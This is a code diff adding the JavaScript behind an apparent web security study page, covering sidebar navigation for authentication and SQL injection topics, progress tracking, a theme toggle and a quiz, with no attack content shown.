+  authTopics.forEach(topic => {
+    const item = document.createElement('div');
+    item.className = 'nav-item' + (studiedTopics.has(topic.id) ? ' studied' : '');
+    item.id = 'nav-' + topic.id;
+    item.innerHTML = `
+      <span class="nav-icon">🔐</span>
+      <span>${topic.title}</span>
+      <span class="nav-check">✓</span>
+    `;
+    item.onclick = () => {
+      scrollToCard(topic.id);
+      closeSidebar();
+    };
+    nav.appendChild(item);
+  });
+
+  // SQLi section
+  const sqliHeader = document.createElement('div');
+  sqliHeader.className = 'nav-section-header';
+  sqliHeader.style.marginTop = '8px';
+  sqliHeader.textContent = 'SQL Injection';
+  nav.appendChild(sqliHeader);
+
+  sqliTopics.forEach(topic => {
+    const item = document.createElement('div');
+    item.className = 'nav-item' + (studiedTopics.has(topic.id) ? ' studied' : '');
+    item.id = 'nav-' + topic.id;
+    item.innerHTML = `
+      <span class="nav-icon">💉</span>
+      <span>${topic.title}</span>
+      <span class="nav-check">✓</span>
+    `;
+    item.onclick = () => {
+      scrollToCard(topic.id);
+      closeSidebar();
+    };
+    nav.appendChild(item);
+  });
+}
+
+function updateSidebarStudied() {
+  [...studiedTopics].forEach(id => {
+    const navItem = document.getElementById('nav-' + id);
+    if (navItem) navItem.classList.add('studied');
+  });
+  // Remove from unstudied
+  const allItems = document.querySelectorAll('.nav-item');
+  allItems.forEach(item => {
+    const id = item.id.replace('nav-', '');
+    if (!studiedTopics.has(id)) item.classList.remove('studied');
+  });
+}
+
+function scrollToCard(id) {
+  const card = document.getElementById('card-' + id);
+  if (card) {
+    card.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    if (!card.classList.contains('open')) {
+      card.classList.add('open');
+    }
+  }
+}
+
+/* ============================================================
+   PROGRESS
+   ============================================================ */
+function updateProgress() {
+  const total = authTopics.length + sqliTopics.length;
+  const studied = studiedTopics.size;
+  const pct = total > 0 ? Math.round((studied / total) * 100) : 0;
+
+  document.getElementById('dash-total').textContent = total;
+  document.getElementById('dash-studied').textContent = studied;
+  document.getElementById('dash-pct').textContent = pct + '%';
+  document.getElementById('dash-quiz').textContent = quizState.bestScore !== null ? quizState.bestScore + '/' + quizQuestions.length : '—';
+
+  document.getElementById('sb-studied').textContent = studied;
+  document.getElementById('sb-total').textContent = total;
+  document.getElementById('sb-pct').textContent = pct + '%';
+  document.getElementById('sb-pct2').textContent = pct + '%';
+  document.getElementById('sb-quiz-score').textContent = quizState.bestScore !== null ? quizState.bestScore : '—';
+
+  document.getElementById('progressFill').style.width = pct + '%';
+}
+
+function resetProgress() {
+  if (!confirm('Reset all study progress?')) return;
+  studiedTopics.clear();
+  localStorage.removeItem('wsh_studied');
+  document.querySelectorAll('.topic-card.studied').forEach(c => c.classList.remove('studied'));
+  document.querySelectorAll('.nav-item.studied').forEach(n => n.classList.remove('studied'));
+  updateProgress();
+}
+
+/* ============================================================
+   THEME
+   ============================================================ */
+function toggleTheme() {
+  const html = document.documentElement;
+  const current = html.getAttribute('data-theme');
+  html.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
+  localStorage.setItem('wsh_theme', html.getAttribute('data-theme'));
+}
+
+/* ============================================================
+   QUIZ
+   ============================================================ */
+function openQuiz() {
+  quizState.current = 0;
+  quizState.score = 0;
+  quizState.answered = false;
+  // Shuffle questions
+  quizState.questions = [...quizQuestions].sort(() => Math.random() - 0.5);
+  document.getElementById('quizOverlay').classList.add('active');
+  renderQuizQuestion();
+}
+
+function closeQuiz() {
+  document.getElementById('quizOverlay').classList.remove('active');
+}
+
+function renderQuizQuestion() {
+  const content = document.getElementById('quizContent');
+  const total = quizState.questions.length;
+  const idx = quizState.current;
+
+  if (idx >= total) {
+    // Show results
+    const pct = Math.round((quizState.score / total) * 100);
+    const pass = pct >= 70;
+    if (quizState.bestScore === null || quizState.score > quizState.bestScore) {
+      quizState.bestScore = quizState.score;
+      localStorage.setItem('wsh_quiz_best', quizState.score);
+    }
+    updateProgress();
+    content.innerHTML = `
+      <div class="quiz-results">
+        <div class="quiz-result-score ${pass ? 'pass' : 'fail'}">${pct}%</div>
+        <div class="quiz-result-grade">${quizState.score} / ${total} correct — ${pass ? '🎉 Excellent work!' : '📚 Keep studying!'}</div>
+        <div style="margin-top:24px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
+          <button class="btn-quiz" onclick="openQuiz()">Try Again</button>
+          <button class="btn-next" style="background:var(--bg-card);color:var(--text-secondary);border:1px solid var(--border);" onclick="closeQuiz()">Close</button>
+        </div>
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border-radius:var(--radius-sm);border:1px solid var(--border);">
+          <div style="font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text-muted);margin-bottom:8px;">Performance</div>
+          <div style="height:8px;background:var(--border);border-radius:4px;overflow:hidden;">
+            <div style="height:100%;width:${pct}%;background:${pass ? 'linear-gradient(90deg,var(--accent-green),var(--accent-cyan))' : 'linear-gradient(90deg,var(--accent-orange),var(--accent-red))'};border-radius:4px;transition:width 1s ease;"></div>
+          </div>
+        </div>
+      </div>
+    `;
+    return;
+  }
+
+  const q = quizState.questions[idx];
+  const letters = ['A', 'B', 'C', 'D'];
+  const optionsHTML = q.opts.map((opt, i) => `
+    <button class="quiz-option" onclick="answerQuiz(${i})" id="qopt-${i}">
+      <span class="opt-letter">${letters[i]}</span>
+      ${opt}
+    </button>
+  `).join('');
+
+  content.innerHTML = `
+    <div class="quiz-body">
+      <div class="quiz-meta">
+        <span class="quiz-counter">Question ${idx + 1} of ${total}</span>
+        <span class="quiz-score-display">Score: ${quizState.score}</span>
+      </div>
+      <div class="quiz-q-num">Q${idx + 1}</div>
+      <div class="quiz-question">${q.q}</div>
+      <div class="quiz-options">${optionsHTML}</div>
+      <div class="quiz-feedback" id="quizFeedback"></div>
+    </div>
+    <div class="quiz-footer">
+      <div class="quiz-progress-bar">
+        <div class="quiz-progress-fill" style="width:${((idx+1)/total*100)}%"></div>
+      </div>
+      <button class="btn-next" id="nextBtn" onclick="nextQuestion()" style="display:none;">Next →</button>
+    </div>
+  `;
+  quizState.answered = false;
+}
+
+function answerQuiz(chosen) {
+  if (quizState.answered) return;
+  quizState.answered = true;
+
+  const q = quizState.questions[quizState.current];
+  const correct = q.ans;
+  const isCorrect = chosen === correct;
+
+  if (isCorrect) quizState.score++;
+
+  // Style options
+  document.querySelectorAll('.quiz-option').forEach((btn, i) => {
+    btn.disabled = true;
+    if (i === correct) btn.classList.add('correct');
+    else if (i === chosen && !isCorrect) btn.classList.add('wrong');
+  });
+
+  // Show feedback
+  const fb = document.getElementById('quizFeedback');
+  fb.className = 'quiz-feedback show ' + (isCorrect ? 'correct-fb' : 'wrong-fb');
+  fb.innerHTML = `<strong>${isCorrect ? '✓ Correct!' : '✗ Incorrect'}</strong> — ${q.exp}`;
+
+  document.getElementById('nextBtn').style.display = 'block';
+}
+
+function nextQuestion() {
+  quizState.current++;
+  renderQuizQuestion();
+}
+
+/* ============================================================
+   SCROLL & MOBILE
+   ============================================================ */
+function scrollToTop() {
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+window.addEventListener('scroll', () => {
+  const btn = document.getElementById('backToTop');
+  if (window.scrollY > 400) btn.classList.add('show');
+  else btn.classList.remove('show');
+});
+
+function toggleSidebar() {
+  document.getElementById('sidebar').classList.toggle('mobile-open');
+}
+
+function closeSidebar() {
+  document.getElementById('sidebar').classList.remove('mobile-open');
+}
+
+/* ============================================================
+   INIT
+   ============================================================ */
+(function init() {
+  // Apply saved theme
+  const savedTheme = localStorage.getItem('wsh_theme');
+  if (savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);
+
+  // Render topics
+  renderTopics(authTopics, 'auth-topics', 'auth');
+  renderTopics(sqliTopics, 'sqli-topics', 'sqli');
+
+  // Build sidebar
+  buildSidebarNav();
+
+  // Update progress
+  updateProgress();
+  updateSidebarStudied();
+})();
+</script>
+</body>
+</html>
